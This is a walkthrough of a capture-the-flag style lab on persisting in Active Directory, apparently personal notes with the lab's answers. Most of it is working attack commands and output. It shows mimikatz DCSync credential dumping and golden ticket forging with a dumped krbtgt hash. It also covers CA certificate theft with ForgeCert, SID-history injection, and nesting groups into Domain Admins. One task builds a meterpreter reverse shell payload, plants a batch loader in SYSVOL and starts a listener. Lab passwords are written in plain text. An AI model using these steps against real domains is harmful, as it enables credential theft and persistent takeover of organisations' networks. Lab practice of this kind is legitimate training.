---
tags:
  - AD
  - THM
  - Pentesting
---
# Persisting Active Directory

## Task 1

```shell
cat /etc/resolv.conf
search za.tryhackme.com
nameserver 10.200.83.101
nameserver 9.9.9.9

# Shorten name resolution timeouts to 1 second
options timeout:1
# Only attempt to resolve a hostname 2 times
options attempts:2
```

Verify functionality: `dig thmdc.za.tryhackme.loc` or  `nslookup thmdc.za.tryhackme.loc`

<http://distributor.za.tryhackme.loc/creds>

```shell
export AD=za.tryhackme.loc
export USERNAME=jason.jackson
export PASSWORD=Racer2018

ssh $AD\\$USERNAME@thmwrk1.$AD
```

## Task 2

```bash
# provided

export AD=za.tryhackme.loc
export adminUser=Administrator
export adminPass=tryhackmewouldnotguess1@

ssh $adminUser@$AD@thmwrk1.$AD

powershell.exe -ep bypass

C:\Tools\mimikatz_trunk\WIN32\mimikatz.exe
```

```powershell
# mimikatz

lsadump::dcsync /domain:za.tryhackme.loc /user:jason.jackson
log jason.jackson_dcdump.txt
lsadump::dcsync /domain:za.tryhackme.loc /all
```

```powershell
C:\Tools\mimikatz_trunk\Win32\mimikatz.exe 'lsadump::dcsync /domain:za.tryhackme.loc /all' > dcsyncall.txt
```

```bash
scp $adminUser@$AD@thmwrk1.$AD:C:/Users/Administrator.ZA/.txt .
cat jason.jackson_dcdump.txt | grep -A10 krbtgt | grep NTLM
```

Answer 1:
> lsadump::dcsync /domain:za.tryhackme.loc /user:test

Answer 2:
> 16f9af38fca3ada405386b3b57366082

## Task 3

```shell
export AD=za.tryhackme.loc
export USERNAME=jason.jackson
export PASSWORD=Racer2018


ssh $AD\\$USERNAME@thmwrk1.$AD
```

```powershell
powershell.exe -ep bypass

Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc
DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
DNSRoot                            : za.tryhackme.loc
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc
Forest                             : tryhackme.loc
InfrastructureMaster               : THMDC.za.tryhackme.loc
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc}
LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
ManagedBy                          :
Name                               : za
NetBIOSName                        : ZA
ObjectClass                        : domainDNS
ObjectGUID                         : 1fc9e299-da51-4d03-baa0-862c3360c0b2
ParentDomain                       : tryhackme.loc
PDCEmulator                        : THMDC.za.tryhackme.loc
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {THMDC.za.tryhackme.loc}
RIDMaster                          : THMDC.za.tryhackme.loc
SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc



C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

```powershell
# mimikatz

kerberos::golden /admin:fake4user /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3
b57366082 /endin:600 /renewmax:10080 /ptt
```

Parameters explained:

- **/admin** - The username we want to impersonate. This does not have to be a valid user.
- **/domain** - The FQDN of the domain we want to generate the ticket for.
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
- **/sid** -The SID of the domain we want to generate the ticket for.
- **/krbtgt** -The NTLM hash of the KRBTGT account.
- **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
- **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

```plain
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Lifetime  : 6/17/2024 3:47:03 PM ; 6/18/2024 1:47:03 AM ; 6/24/2024 3:47:03 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'fake4user @ za.tryhackme.loc' successfully submitted for current session
```

```powershell
klist
dir \\thmdc.za.tryhackme.loc\C$\Users


    Directory: \\thmdc.za.tryhackme.loc\C$\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/11/2024   8:54 PM                Administrator
d-----        4/27/2022   8:22 AM                Administrator.TRYHACKME
d-r---        3/21/2020   8:25 PM                Public
d-----        3/21/2020   8:52 PM                vagrant

```

```powershell
# mimikatz
kerberos::golden /admin:fake4user /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
```

```powershell
klist
dir \\THMSERVER1.za.tryhackme.loc\C$\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/30/2022  11:07 AM                inetpub
d-----        9/15/2018   8:19 AM                PerfLogs
d-r---        4/30/2022  11:07 AM                Program Files
d-----        4/30/2022  11:07 AM                Program Files (x86)
d-----        4/27/2022   9:24 PM                Python310
d-----        4/30/2022  11:17 AM                Temp
d-----        4/25/2022   8:59 PM                tmp
d-r---        6/30/2022  11:08 PM                Users
d----l        4/25/2022   8:57 PM                vagrant
d-----        4/27/2022   9:24 PM                Windows
-a----        4/30/2022   3:45 PM           7743 auto-login.ps1
-a----         1/4/2022   7:47 AM            103 delete-vagrant-user.ps1
-a----         3/2/2022   8:32 PM            718 thm-network-setup.ps1

```

Parameters explained:

- **/admin** - The username we want to impersonate. This does not have to be a valid user.
- **/domain** - The FQDN of the domain we want to generate the ticket for.
- **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
- **/sid** -The SID of the domain we want to generate the ticket for.
- **/target** - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.
- **/rc4** - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.
- **/service** - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
- **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

Answer 1:
> krbtgt

Answer 2:
> golden ticket

Answer 3:
> silver ticket

Answer 4:
> 10

## Task 4

```bash
# provided

export AD=za.tryhackme.loc
export adminUser=Administrator
export adminPass=tryhackmewouldnotguess1@

ssh $adminUser@$AD@thmdc.$AD
```

```powershell
# THMDC Admin

powershell.exe -ep bypass

mkdir f4u
cd f4u

C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

```powershell
# mimikatz

crypto::certificates /systemstore:local_machine # Enum certs

privilege::debug

# Allow certificate export without private key
crypto::capi
crypto::cng # If you get an error, don't worry, it just means someone else executed the patch before you. With these services patched, we can use Mimikatz to export the certificates:

crypto::certificates /systemstore:local_machine /export

exit
```

```powershell
Get-ChildItem .\*.pfx

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2024   6:06 PM           3299 local_machine_My_0_.pfx
-a----        6/17/2024   6:06 PM           2685 local_machine_My_1_za-THMDC-CA.pfx
-a----        6/17/2024   6:06 PM           3380 local_machine_My_2_THMDC.za.tryhackme.loc.pfx
-a----        6/17/2024   6:06 PM           3321 local_machine_My_3_.pfx

```

```bash
# kali vm

export AD=za.tryhackme.loc
export adminUser=Administrator
export adminPass=tryhackmewouldnotguess1@
export USERNAME=jason.jackson
export PASSWORD=Racer2018

scp $adminUser@$AD@thmdc.$AD:C:/Users/Administrator/f4u/local_machine_My_1_za-THMDC-CA.pfx .

scp local_machine_My_1_za-THMDC-CA.pfx $USERNAME@$AD@THMWRK1.$AD:C:/Users/jason.jackson
```

```powershell
# THMWRK1 jason

powershell -ep bypass

Get-ChildItem .\*.pfx

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2024   7:47 PM           2685 local_machine_My_1_za-THMDC-CA.pfx


C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath .\local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject 'CN=f4u' -
-SubjectAltName 'Administrator@za.tryhackme.loc' --NewCertPath .\f4uPwnd.pfx --NewCertPassword f4upass


C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:'.\f4uPwnd.pfx' /password:'f4upass' /outfile:dom
ain-admin.kirbi /domain:za.tryhackme.loc /dc:10.200.82.101

C:\Tools\mimikatz_trunk\x64\mimikatz.exe

```

```powershell
# mimikatz

mimikatz # kerberos::ptt f4uPwnd.kirbi

mimikatz # exit
```

Answer 1:
>private key

Answer 2:
>ForgeCert.exe

Answer 3:
>kerberos::ptt ticket.kirbi

## Task 5

```bash
# kali-vm

export AD=za.tryhackme.loc
export adminUser=Administrator
export adminPass=tryhackmewouldnotguess1@

ssh $adminUser@$AD@thmdc.$AD
```

```powershell
powershell -ep bypass

Get-ADUser 'jason.jackson' -Properties sidhistory,memberof

DistinguishedName : CN=jason.jackson,OU=Finance,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled           : True
GivenName         : Jason
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
Name              : jason.jackson
ObjectClass       : user
ObjectGUID        : cb65e169-378e-4913-8184-fbb1a6ac45d8
SamAccountName    : jason.jackson
SID               : S-1-5-21-3885271727-2693558621-2658995185-1163
SIDHistory        : {}
Surname           : Jackson
UserPrincipalName :


Get-ADGroup 'Domain Admins'

DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Global
Name              : Domain Admins
ObjectClass       : group
ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922
SamAccountName    : Domain Admins
SID               : S-1-5-21-3885271727-2693558621-2658995185-512


Stop-Service ntds -Force

Add-ADDBSidHistory -SamAccountName 'jason.jackson' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath 'C:\Windows\NTDS\ntds.dit'

Start-Service ntds
```

```shell
export AD=za.tryhackme.loc
export USERNAME=jason.jackson
export PASSWORD=Racer2018

ssh $AD\\$USERNAME@thmwrk1.$AD

powershell -ep bypass

Get-ADUser $env:username -Properties sidhistory

dir \\thmdc.za.tryhackme.loc\C$
```

Answer 1:
>SIDHistory

Answer 2:
>ntds.dit

Answer 3:
>Start-Service -Name ntds

## Task 6

```bash
# kali-vm

export AD=za.tryhackme.loc
export adminUser=Administrator
export adminPass=tryhackmewouldnotguess1@

ssh $adminUser@$AD@thmdc.$AD
```

```powershell
```powershell
powershell -ep bypass

# Create 1st group in People\IT OU
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "f4u_Group_1" -SamAccountName "f4u_group1" -DisplayName "f4u_Group_1" -GroupScope Global -GroupCategory Security

# Create 2nd group in People\Sales OU
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "f4u_Group_2" -SamAccountName "f4u_group2" -DisplayName "f4u_Group_2" -GroupScope Global -GroupCategory Security

# Create 3rd group in People\Consulting OU
New-ADGroup -Path "OU=CONSULTING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "f4u_Group_3" -SamAccountName "f4u_group3" -DisplayName "f4u_Group_3" -GroupScope Global -GroupCategory Security

# Create 4th group in People\Marketing OU
New-ADGroup -Path "OU=MARKETING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "f4u_Group_4" -SamAccountName "f4u_group4" -DisplayName "f4u_Group_4" -GroupScope Global -GroupCategory Security

# Create 5th group in People\IT OU
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "f4u_Group_5" -SamAccountName "f4u_group5" -DisplayName "f4u_Group_5" -GroupScope Global -GroupCategory Security

# Add Group 1 to Group 2
Add-ADGroupMember -Identity 'f4u_group2' -Members 'f4u_group1'

# Add Group 2 to Group 3
Add-ADGroupMember -Identity 'f4u_group3' -Members 'f4u_group2'

# Add Group 3 to Group 4
Add-ADGroupMember -Identity 'f4u_group4' -Members 'f4u_group3'

# Add Group 4 to Group 5
Add-ADGroupMember -Identity 'f4u_group5' -Members 'f4u_group4'

# Add Group 5 to Domain Admins
Add-ADGroupMember -Identity 'Domain Admins' -Members 'f4u_group5'

# Add unprivileged user to Group 1
Add-ADGroupMember -Identity 'f4u_group1' -Members 'jason.jackson'
```

```bash
export AD=za.tryhackme.loc
export USERNAME=jason.jackson
export PASSWORD=Racer2018

ssh $AD\\$USERNAME@thmwrk1.$AD
```

```powershell
powershell -ep bypass

Get-ADGroupMember -Identity "Domain Admins"
```

Answer 1:
>Group Nesting

Answer 2:
>Add-ADGroupMember -Identity thmgroup -Members thmtest

## Task 7

```bash
export AD=za.tryhackme.loc
export USERNAME=jason.jackson
export PASSWORD=Racer2018

xfreerdp /v:thmwrk1.$AD /u:$USERNAME /p:$PASSWORD
```

```powershell
runas /netonly /user:za.tryhackme.loc\Administrator cmd.exe
```

```cmd
mmc
```

Follow the instructions on THM

```cmd
powershell -ep bypass
```

```powershell
Import-Module .\Invoke-ADSDPropagation.ps1

Invoke-ADSDPropagation
```

Answer 1:
> AdminSDHolder

Answer 2:
> SDprop

Answer 3:
> Full controll

## Task 8

```bash
# kali vm

export AD=za.tryhackme.loc
export adminUser=Administrator
export adminPass=tryhackmewouldnotguess1@

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=445 -f exe > f4u.exe

echo 'copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\f4u.exe C:\tmp\f4u.exe && timeout /t 20 && C:\tmp\f4u.exe' > f4u.bat

scp f4u.* $adminUser@$AD@thmdc.$AD:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 445;exploit"
```

```bash
export AD=za.tryhackme.loc
export adminUser=Administrator
export adminPass=tryhackmewouldnotguess1@

xfreerdp /v:thmdc.$AD /u:$adminUser /p:$adminPass
```

`win` + `r`  `mmc`

Follow the instructions on THM

`jason.jackson - persisting GPO`

add `AD Users and Computers` to MMC and change a password of a admin-user

```bash
# kali vm

xfreerdp /v:thmserver1.za.tryhackme.loc /u:'t1_jayne.cox' /p:'!F4upassword'
```

Follow the instructions on THM

Answer 1:
>Group Policy Management

Answer 2:
>Restricted Groups

Answer 3:
>Delegation
